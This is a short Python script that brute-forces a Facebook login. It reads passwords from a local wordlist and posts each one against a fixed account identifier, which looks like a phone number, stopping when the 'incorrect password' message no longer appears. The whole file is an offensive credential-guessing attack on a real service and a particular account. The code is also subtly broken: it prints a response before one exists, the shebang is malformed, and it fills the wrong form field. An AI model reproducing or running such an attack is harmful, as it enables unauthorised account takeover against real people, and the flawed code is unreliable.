#/usr/bin/env python

import requests

target_url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=110"
data = {"email": "8126460450" , "pass" : "", "login" : "submit"}

print(response.content)

with open("/root/Downloads/password.txt", "r" ) as wordlist_file:
    for line in wordlist_file :
        word = line.strip()
        data["password"] = word
        response = requests.post(target_url, data=data)
        if "The password that you've entered is incorrect." not in response.content:
            print("[+] Got the password --> " + word)
            exit()
print("[+] Reacherd end of line without any error but didn't get password in wordlist.")
